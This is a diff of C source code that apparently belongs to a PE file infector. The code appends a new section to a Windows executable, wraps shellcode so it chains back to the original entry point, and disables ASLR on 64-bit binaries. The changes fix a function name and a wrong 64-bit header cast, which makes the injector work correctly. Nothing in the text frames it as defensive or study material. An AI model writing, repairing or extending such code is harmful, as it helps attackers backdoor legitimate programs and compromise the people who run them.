@@ -158,7 +158,7 @@ char *pe = load_file(file_name , &size);
     nt32->FileHeader.NumberOfSections += 1;
     nt32->OptionalHeader.SizeOfImage = next[NumSections].VirtualAddress + next[NumSections].Misc.VirtualSize;
     uint32_t extend = next[NumSections].PointerToRawData +  next[NumSections].SizeOfRawData;
-    char *payload = applysuffix(shellcode,shellcode_len,oryginal_entry,next[NumSections].VirtualAddress);
+    char *payload = apply_suffix(shellcode,shellcode_len,oryginal_entry,next[NumSections].VirtualAddress);
     extend_file(file_name,extend);
     if(write_data(file_name,0,pe,size)==-1){
         free(pe);
@@ -175,7 +175,7 @@ char *pe = load_file(file_name , &size);
     return 0;
     }
     if(machine_type == 0x8664){
-        PIMAGE_NT_HEADERS64 nt64 = (PIMAGE_NT_HEADERS32)(pe + dos->e_lfanew);
+        PIMAGE_NT_HEADERS64 nt64 = (PIMAGE_NT_HEADERS64)(pe + dos->e_lfanew);
         oryginal_entry = nt64->OptionalHeader.AddressOfEntryPoint + nt64->OptionalHeader.ImageBase;
         nt64->OptionalHeader.DllCharacteristics &= ~0x0040;
     
@@ -202,7 +202,7 @@ char *pe = load_file(file_name , &size);
         nt64->FileHeader.NumberOfSections += 1;
         nt64->OptionalHeader.SizeOfImage = next[NumSections].VirtualAddress + next[NumSections].Misc.VirtualSize;
         extend = next[NumSections].PointerToRawData +  next[NumSections].SizeOfRawData;
-        payload = applysuffix(shellcode,shellcode_len,oryginal_entry,next[NumSections].VirtualAddress);
+        payload = apply_suffix(shellcode,shellcode_len,oryginal_entry,next[NumSections].VirtualAddress);
         extend_file(file_name,extend);
         if(write_data(file_name,0,pe,size)==-1){
             free(pe);
